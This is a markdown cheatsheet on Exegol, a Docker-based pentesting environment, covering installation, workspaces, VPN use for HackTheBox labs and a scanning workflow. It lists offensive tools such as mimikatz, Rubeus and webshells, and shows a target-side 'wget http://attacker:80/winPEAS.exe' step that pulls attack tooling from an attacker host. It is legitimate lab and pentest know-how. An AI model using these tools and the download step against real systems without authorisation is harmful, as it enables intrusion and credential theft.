# Exegol: The Docker-Based Hacking Env

`#pentest` `#docker` `#redteam` `#kali-killer`

A modern, Docker-based alternative to Kali Linux for offensive security.

---

!!! question "Why Exegol?"
    **The Kali Problem:**

    - Monolithic VM that breaks on `apt upgrade`
    - Dependency conflicts between tools
    - Bloated with tools you never use
    - Hard to version control your setup

    **The Exegol Solution:**

    - Disposable Docker containers
    - Immutable, versioned tool images
    - Persistent workspace for your data
    - Clean host system, no pollution

    **Key Benefit:** *Clean host, no dependency hell, fully versioned environments.*

---

## Installation

### Prerequisites

- Docker (Desktop or Engine)
- Python 3.10+

### Install Exegol Wrapper

```bash
# Recommended: Install with pipx (isolated environment)
pipx install exegol

# Alternative: pip
pip install exegol --user

# Verify installation
exegol version
```

### Pull Your First Image

```bash
# List available images
exegol install

# Install the full image (all tools)
exegol install full

# Or lighter alternatives
exegol install light   # Common tools only
exegol install ad      # Active Directory focused
exegol install osint   # OSINT tools
exegol install web     # Web pentest tools
```

---

## Core Commands Cheatsheet

| Command | Description |
|---------|-------------|
| `exegol install` | List/install available images |
| `exegol start <name> <image>` | Create and start a container |
| `exegol stop <name>` | Stop a running container |
| `exegol remove <name>` | Delete a container |
| `exegol exec <name>` | Open new shell in running container |
| `exegol info` | Show system info and containers |
| `exegol update` | Update wrapper and images |

### Quick Start Example

```bash
# Create a container named "htb" using the "full" image
exegol start htb full

# You're now inside the container with all tools ready
# When done:
exit

# Re-enter the same container later
exegol start htb
```

---

## Pro Features

### The Workspace (`/workspace`)

!!! danger "Rule #1: Always Save Your Loot in /workspace"
    `/workspace` inside the container maps to a folder on your **host machine**.

    Everything else in the container is **ephemeral**—if you delete the container, it's gone.

```bash
# Inside container
cd /workspace

# Your notes, exploits, screenshots go HERE
mkdir notes scans exploits

# This persists even if you destroy the container
```

**Default location on host:** `~/.exegol/workspaces/<container_name>/`

### Resources (`/opt/resources`)

Pre-downloaded offensive tools ready to upload to targets:

```bash
ls /opt/resources/

# Contents include:
# ├── linux/
# │   ├── linpeas.sh
# │   ├── pspy64
# │   └── linux-exploit-suggester.sh
# ├── windows/
# │   ├── mimikatz/
# │   ├── winPEAS.exe
# │   ├── SharpHound.exe
# │   └── Rubeus.exe
# └── webshells/
```

```bash
# Serve to target via HTTP
cd /opt/resources/windows
python -m http.server 80

# On target:
# wget http://attacker:80/winPEAS.exe
```

### VPN Integration

Connect your container to HackTheBox, TryHackMe, or client VPNs:

```bash
# Start container with VPN
exegol start htb full --vpn /path/to/lab.ovpn

# The container's network goes through the VPN
# Your host network remains untouched
```

```bash
# Multiple VPN profiles
exegol start client1 full --vpn ~/vpn/client1.ovpn
exegol start htb full --vpn ~/vpn/hackthebox.ovpn
```

!!! tip "VPN per engagement"
    Each container can have its own VPN connection. Perfect for separating client engagements.

### GUI Tools (X11)

Run graphical tools like Burp Suite, Firefox:

```bash
# Linux (X11 forwarding automatic)
exegol start audit full
burpsuite &

# macOS (requires XQuartz)
exegol start audit full --desktop
```

### Custom Configuration

```bash
# Mount additional volumes
exegol start audit full -v /path/to/scripts:/custom

# Expose ports
exegol start audit full -p 8080:8080

# Privileged mode (for certain exploits)
exegol start audit full --privileged
```

---

## Comparison: Kali VM vs Exegol

| Aspect | Kali VM | Exegol |
|--------|---------|--------|
| **Type** | Full Virtual Machine | Docker Container |
| **Size** | 10-30 GB | 5-15 GB (image) |
| **Boot time** | 30-60 seconds | 1-2 seconds |
| **Tool updates** | `apt upgrade` (can break) | Pull new image (immutable) |
| **State** | Stateful (changes persist) | Stateless system, stateful data |
| **Host pollution** | Full OS in VM | None (isolated container) |
| **Multi-environment** | Multiple VMs = heavy | Multiple containers = light |
| **Versioning** | Manual snapshots | Docker tags (full:2024.01) |
| **Rollback** | Restore snapshot | Use previous image tag |
| **Resource usage** | High (RAM, CPU reserved) | Low (shared kernel) |

---

## Workflow Example: HTB Machine

```bash
# 1. Start fresh container for the box
exegol start htb-devvortex full --vpn ~/htb/lab.ovpn

# 2. Inside container - create workspace structure
cd /workspace
mkdir -p devvortex/{nmap,web,privesc}

# 3. Run your scans (tools pre-installed)
nmap -sCV -oA devvortex/nmap/initial 10.10.11.xxx
feroxbuster -u http://devvortex.htb -o devvortex/web/ferox.txt

# 4. All output saved to /workspace (persists on host)

# 5. When done, container can be removed
exit
exegol remove htb-devvortex
# Workspace data still exists at ~/.exegol/workspaces/htb-devvortex/
```

---

## Useful Aliases

Add to your `~/.bashrc` or `~/.zshrc`:

```bash
# Quick start for common scenarios
alias htb='exegol start htb full --vpn ~/vpn/htb.ovpn'
alias thm='exegol start thm full --vpn ~/vpn/thm.ovpn'
alias audit='exegol start audit full'

# Quick shell into running container
alias exs='exegol start'
alias exe='exegol exec'
```

!!! info "Official Resources"
    - GitHub: [ThePorgs/Exegol](https://github.com/ThePorgs/Exegol)
    - Docs: [exegol.readthedocs.io](https://exegol.readthedocs.io)
    - Discord: Active community for support
